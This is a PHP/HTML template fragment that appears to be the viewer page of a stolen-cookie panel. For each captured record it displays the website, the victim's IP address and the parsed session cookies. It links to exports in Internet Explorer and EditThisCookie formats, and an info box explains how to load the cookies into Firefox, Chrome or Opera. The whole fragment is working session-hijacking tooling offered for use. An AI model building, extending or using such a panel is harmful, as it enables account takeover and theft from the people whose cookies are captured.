<div class="row">
            <div class="col-xs-12">
              <div class="box box-solid">
                <div class="box-header with-border">
                  <i class="fa fa-asterisk"></i>
                  <h3 class="box-title"><?=$data["website"] ?> <span class="badge bg-red"><?=$data["ip"] ?></span></h3>
                </div><!-- /.box-header -->
                <div class="box-body">
                 <dl class="dl-horizontal">
                  <? 
                  $cookies = explode("; ", $data["cookie"]);
                  foreach ($cookies as $k => $v) {
                    list($name, $value) = explode("=", $v);
                    ?>
                    <dt><?=$name ?></dt>
                    <dd><?=$value ?></dd>
                    <? } ?>


                  </dl>

                    <div class="box-footer">
                      <a target="_blank" href="v-cookie.php?id=<?=$data["unique_id"] ?>&dl=ie"><button type="submit" class="btn btn-success btn-sm"><i class="fa fa-arrow-right"></i> IE format export</button></a>
                      <a target="_blank" href="v-cookie.php?id=<?=$data["unique_id"] ?>&dl=etc"><button type="submit" class="btn btn-primary btn-sm"><i class="fa fa-arrow-right"></i> EditThisCookie format export</button></a>
                    </div>

                </div><!-- /.box-body -->
              </div><!-- /.box -->
            </div>
          </div>

<div class="row">
            <div class="col-xs-12">
              <div class="box box-solid">
                <div class="box-header with-border">
                  <i class="fa fa-info"></i>
                  <h3 class="box-title">Cookies Import & Export info</h3>
                </div><!-- /.box-header -->
                <div class="box-body">
                  <dl>
                    <dt>Internet Explorer type export / Firefox</dt>
                    <dd>To import cookies in firefox you can use this plugin <a target="_blank" href="https://addons.mozilla.org/en-US/firefox/addon/cookies-exportimport/">Cookies Export/import</a></dd>
                    <br>
                    <dt>Chrome & Opera (EditThisCookie) JSON type export </dt>
                    <dd>EditThisCookie Chrome download <a target="_blank" href="https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg">here</a></dd>
                    <dd>EditThisCookie Opera download <a target="_blank" href="https://addons.opera.com/en/extensions/details/edit-this-cookie">here</a></dd>
                    <br>
                    <dt>Cookies are set to expire in 60 minutes</dt>
                    <br>
                    <dt>INFO: There are other plugins and i am sure there is a way to import each output type into one of these browsers.</dt>
                  </dl>
                </div><!-- /.box-body -->
              </div><!-- /.box -->
            </div><!-- ./col -->
          </div>